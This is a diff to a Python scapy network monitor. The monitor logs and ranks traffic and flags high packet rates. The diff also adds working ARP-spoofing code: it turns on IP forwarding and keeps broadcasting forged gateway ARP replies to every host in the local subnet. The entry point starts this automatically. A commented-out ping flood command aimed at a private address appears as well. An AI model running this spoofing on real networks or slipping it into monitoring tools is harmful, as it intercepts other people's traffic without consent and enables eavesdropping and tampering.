@@ -1,139 +1,206 @@
-from scapy.all import sniff, IP, TCP, UDP, ICMP, DNS, ARP
+from scapy.all import sniff, IP, TCP, UDP, ICMP, ARP, send, get_if_hwaddr, get_if_addr, conf
 from collections import defaultdict, deque
 import threading
 import time
+import os
 
 class NetworkMonitor:
     def __init__(self):
-        self.traffic_data = defaultdict(lambda: {"packets": 0, "bytes": 0})
+        self.traffic_data = defaultdict(lambda: {"packets": 0, "bytes": 0, "timestamps": deque(maxlen=100)})
         self.traffic_log = deque(maxlen=1000)
         self.lock = threading.Lock()
+        self.high_packet_count_threshold = 100
+        self.high_packet_size_threshold = 1000
+        self.dos_packet_rate_threshold = 50
 
     def analyze_packet(self, packet):
-        if IP in packet:
-            proto = "OTHER"
+        if not (ARP in packet or IP in packet):
+            return
+
+        pkt_len = len(packet)
+        timestamp = time.time()
+        is_malicious = False
+        malicious_reason = ""
+
+        if ARP in packet:
+            proto = "ARP"
+            src = packet[ARP].psrc
+            dst = packet[ARP].pdst
             port = "-"
-            
-            if TCP in packet:
-                dport = packet[TCP].dport
-                if dport == 443:
-                    proto = "HTTPS"
-
-                elif dport == 80:
-                    proto = "HTTP"
-                elif dport == 22:
-                    proto = "SSH"
-                elif dport == 53:
-                    proto = "DNS"
-                elif dport == 21:
-                    proto = "FTP"
-                elif dport == 25:
-                    proto = "SMTP"
-                elif dport == 110:
-                    proto = "POP3"
-
-                elif dport == 143:
-                    proto = "IMAP"
-                elif dport == 3389:
-                    proto = "RDP"
-                elif dport == 8080:
-                    proto = "HTTP-ALT"
-                elif dport == 3306:
-                    proto = "MySQL"
-                elif dport == 6379:
-                    proto = "Redis"
-                elif dport == 27017:
-                    proto = "MongoDB"
-                elif dport == 5000:
-                    proto = "Flask"
-                elif dport == 5001:
-                    proto = "Flask-Alt"
-                elif dport == 5002:
-                    proto = "Flask-Alt2"
-                elif dport == 5003: 
-                    proto = "Flask-Alt3"
-                elif dport == 5004:
-                    proto = "Flask-Alt4"
-                elif dport == 5005:
-                    proto = "Flask-Alt5"
-                elif dport == 5006:
-                    proto = "Flask-Alt6"
-                elif dport == 5007:
-                    proto = "Flask-Alt7"
-                elif dport == 5008:
-                    proto = "Flask-Alt8"
-                elif dport == 5009:
-                    proto = "Flask-Alt9"
-                elif dport == 5010:
-                    proto = "Flask-Alt10"
-                elif dport == 5011:
-                    proto = "Flask-Alt11"
-                elif dport == 5012:
-                    proto = "Flask-Alt12"
-                else:
-                    proto = "TCP"
-                port = dport
-
-            elif UDP in packet:
-                proto = "UDP"
-                port = packet[UDP].dport
-
-            elif ICMP in packet:
-                proto = "ICMP"
-
-            elif DNS in packet:
-                proto = "DNS"
-
-            elif ARP in packet:
-                proto = "ARP"
-              
-
+            key = (src, dst, proto, port)
+            ttl = "-"
+        else:
             src = packet[IP].src
             dst = packet[IP].dst
-            pkt_len = len(packet)
+            ip_proto = packet[IP].proto
+            ttl = getattr(packet[IP], 'ttl', '-')
+            port = "-"
+
+            if ip_proto == 1 and ICMP in packet:
+                proto = "ICMP"
+                icmp_type = packet[ICMP].type
+                icmp_code = packet[ICMP].code
+                port = f"{icmp_type}.{icmp_code}"
+            elif TCP in packet:
+                dport = packet[TCP].dport
+                proto_map = {
+                    443: "HTTPS", 80: "HTTP", 22: "SSH", 53: "DNS",
+                    21: "FTP", 25: "SMTP", 110: "POP3", 143: "IMAP",
+                    3389: "RDP", 8080: "HTTP-ALT", 3306: "MYSQL", 6379: "REDIS",
+                    27017: "MONGODB",
+                }
+                proto = proto_map.get(dport, "TCP")
+                port = str(dport)
+            elif UDP in packet:
+                dport = packet[UDP].dport
+                udp_port_map = {
+                    53: "DNS", 123: "NTP", 67: "DHCP", 68: "DHCP",
+                    69: "TFTP", 161: "SNMP"
+                }
+                proto = udp_port_map.get(dport, "UDP")
+                port = str(dport)
+            else:
+                proto_names = {
+                    2: "IGMP", 6: "TCP", 17: "UDP", 41: "IPv6",
+                    47: "GRE", 50: "ESP", 51: "AH"
+                }
+                proto = proto_names.get(ip_proto, f"IP-Proto-{ip_proto}")
+                port = "-"
             key = (src, dst, proto, port)
 
-            with self.lock:
-                self.traffic_data[key]["packets"] += 1
-                self.traffic_data[key]["bytes"] += pkt_len
+        with self.lock:
+            data = self.traffic_data[key]
+            data["packets"] += 1
+            data["bytes"] += pkt_len
+            data["timestamps"].append(timestamp)
 
-                self.traffic_log.append({
-                    "timestamp": time.time(),
-                    "source_ip": src,
-                    "dest_ip": dst,
-                    "protocol": proto,
-                    "port": str(port),
-                    "packets": 1,
-                    "bytes": pkt_len,
-                    "status": "High" if pkt_len > 1000 else "Normal",
-                    "action": "Logged"
-                })
+            recent_packets = [t for t in data["timestamps"] if t > timestamp - 10]
+            if len(recent_packets) > self.dos_packet_rate_threshold:
+                is_malicious = True
+                malicious_reason = f"High packet rate: {len(recent_packets)} packets in 10s"
+            if pkt_len > self.high_packet_size_threshold:
+                is_malicious = True
+                malicious_reason = f"{malicious_reason}; Large packet size" if malicious_reason else "Large packet size"
+            if data["packets"] > self.high_packet_count_threshold:
+                is_malicious = True
+                malicious_reason = f"{malicious_reason}; High packet count" if malicious_reason else "High packet count"
+
+            self.traffic_log.append({
+                "timestamp": timestamp,
+                "source_ip": src,
+                "dest_ip": dst,
+                "protocol": proto,
+                "port": port,
+                "packets": 1,
+                "bytes": pkt_len,
+                "ttl": ttl,
+                "status": "High" if pkt_len > 1000 else "Normal",
+                "action": "Logged",
+                "is_malicious": is_malicious,
+                "malicious_reason": malicious_reason,
+            })
 
     def start_sniffing(self):
-        sniff(prn=self.analyze_packet, store=0)
+        print("Starting packet capture... (Ctrl+C to stop)")
+        sniff(prn=self.analyze_packet, store=0, filter="ip or arp")
 
     def start(self):
-        sniff_thread = threading.Thread(target=self.start_sniffing, daemon=True)
-        sniff_thread.start()
+        thread = threading.Thread(target=self.start_sniffing, daemon=True)
+        thread.start()
 
     def get_stats(self):
-        """Return summary statistics (aggregated traffic by IP, protocol, port)"""
         with self.lock:
-            return [
+            stats = [
                 {
                     "source_ip": src,
                     "dest_ip": dst,
                     "protocol": proto,
-                    "port": str(port),
-                    "packets": stats["packets"],
-                    "bytes": stats["bytes"],
-                    "status": "High" if stats["packets"] > 100 else "Normal",
-                    "action": "Logged"
+                    "port": port,
+                    "packets": data["packets"],
+                    "bytes": data["bytes"],
+                    "ttl": "-",
+                    "status": "High" if data["packets"] > 100 else "Normal",
+                    "action": "Logged",
+                    "is_malicious": len([t for t in data["timestamps"] if t > time.time() - 10]) > self.dos_packet_rate_threshold,
+                    "malicious_reason": "High packet rate" if
+                        len([t for t in data["timestamps"] if t > time.time() - 10]) > self.dos_packet_rate_threshold else ""
                 }
-                for (src, dst, proto, port), stats in self.traffic_data.items()
+                for (src, dst, proto, port), data in self.traffic_data.items()
             ]
+        return sorted(stats, key=lambda x: x["packets"], reverse=True)
 
-    def get_latest_packets(self, count=10, offset=0):
-        """Return the latest `count` packet logs (in reverse time order)"""
+    def filter_by_protocol(self, protocol: str):
+        protocol = protocol.upper()
         with self.lock:
-            return list(self.traffic_log)[::-1][offset:offset + count]
+            filtered = [
+                {
+                    "source_ip": src,
+                    "dest_ip": dst,
+                    "protocol": proto,
+                    "port": port,
+                    "packets": data["packets"],
+                    "bytes": data["bytes"],
+                }
+                for (src, dst, proto, port), data in self.traffic_data.items()
+                if protocol == proto.upper()
+            ]
+        return sorted(filtered, key=lambda x: x["packets"], reverse=True)
+
+# ======================
+#sudo ping -f -s 1000 192.168.100.11
+
+# ARP Spoofing Functions
+# ======================
+
+def enable_ip_forwarding():
+    if os.name == "posix":
+        try:
+            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+                f.write("1\n")
+            print("[✓] IP forwarding enabled.")
+        except Exception as e:
+            print(f"[!] Failed to enable IP forwarding: {e}")
+
+def arp_spoof_all_devices(interface="eth0", interval=5):
+    local_ip = get_if_addr(interface)
+    local_mac = get_if_hwaddr(interface)
+    gateway_ip = conf.route.route("0.0.0.0")[2]
+
+    base_ip = '.'.join(local_ip.split('.')[:-1])
+    print(f"[ARP Spoofing] Claiming to be gateway {gateway_ip} from {local_mac}")
+
+    while True:
+        for i in range(1, 255):
+            target_ip = f"{base_ip}.{i}"
+            if target_ip in [local_ip, gateway_ip]:
+                continue
+            arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=local_mac)
+            send(arp_response, verbose=False)
+        time.sleep(interval)
+
+# ======================
+# Entry Point
+# ======================
+
+if __name__ == "__main__":
+    nm = NetworkMonitor()
+    nm.start()
+
+    enable_ip_forwarding()  # optional but useful
+    spoof_thread = threading.Thread(target=arp_spoof_all_devices, args=("eth0",), daemon=True)
+    spoof_thread.start()
+
+    print("Network monitor and ARP spoofing started...")
+
+    try:
+        while True:
+            time.sleep(10)
+            stats = nm.get_stats()
+            print("\nTop traffic stats:")
+            for stat in stats[:10]:
+                mal_flag = "!!MALICIOUS!!" if stat.get("is_malicious") else ""
+                reason = stat.get("malicious_reason", "")
+                print(f"{stat['source_ip']} -> {stat['dest_ip']} | {stat['protocol']}:{stat['port']} "
+                      f"Packets: {stat['packets']} Bytes: {stat['bytes']} {mal_flag} {reason}")
+    except KeyboardInterrupt:
+        print("Stopping...")
